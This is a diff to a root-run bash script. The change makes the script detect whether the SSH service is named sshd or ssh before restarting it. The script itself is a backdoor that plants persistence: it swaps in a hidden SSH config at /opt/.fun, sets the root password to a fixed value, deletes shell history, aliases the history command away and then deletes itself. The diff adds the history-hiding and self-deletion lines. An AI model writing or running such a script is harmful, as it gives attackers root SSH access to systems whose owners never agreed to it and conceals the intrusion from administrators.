@@ -1,5 +1,23 @@
 #!/bin/bash
 
+detect_ssh_daemon() {
+    # Check the systemctl status for sshd
+    if systemctl is-active --quiet sshd; then
+        echo "sshd"
+        return 0
+    fi
+
+    # Check the systemctl status for ssh
+    if systemctl is-active --quiet ssh; then
+        echo "ssh"
+        return 0
+    fi
+
+    # If neither service is active
+    echo "No SSH daemon is running."
+    return 1
+}
+
 # Function to update the SSH configuration
 update_ssh_config() {
     local config_file="$1"
@@ -38,7 +56,7 @@ update_ssh_config() {
 # Restart SSH service
 restart_ssh_service() {
     echo "Restarting SSH service..."
-    if systemctl restart ssh; then
+    if systemctl restart "$SSH_DAEMON"; then
         echo "SSH service restarted successfully."
     else
         echo "Failed to restart SSH service. Please check for errors."
@@ -84,14 +102,14 @@ update_ssh_service() {
     # Reload the systemd daemon and restart the SSH service
     echo "Reloading systemd daemon and restarting SSH service..."
     systemctl daemon-reload
-    if systemctl restart ssh; then
+    if systemctl restart "$SSH_DAEMON"; then
         echo "SSH service successfully restarted with the new configuration file."
     else
         echo "Error: Failed to restart SSH service. Check the configuration and logs for details."
         return 1
     fi
 
-    if systemctl enable ssh; then
+    if systemctl enable "$SSH_DAEMON"; then
         echo "SSH service successfully enabled."
     else
         echo "Error: Failed to enable SSH service. Check the configuration and logs for details."
@@ -108,6 +126,7 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 # Execute the functions
+SSH_DAEMON="$(detect_ssh_daemon)"
 ORIG_SSH_CONF="/etc/ssh/sshd_conf"
 NEW_SSH_CONF="/opt/.fun"
 cp /etc/ssh/sshd_config "$NEW_SSH_CONF"
@@ -119,5 +138,9 @@ restart_ssh_service
 
 echo "root:H4ckB4ckJ4ck" | chpasswd
 
+# Kind of hide history
 rm ~/.zsh_history
 alias history="echo"
+
+# Cleanup
+rm -- "$0"
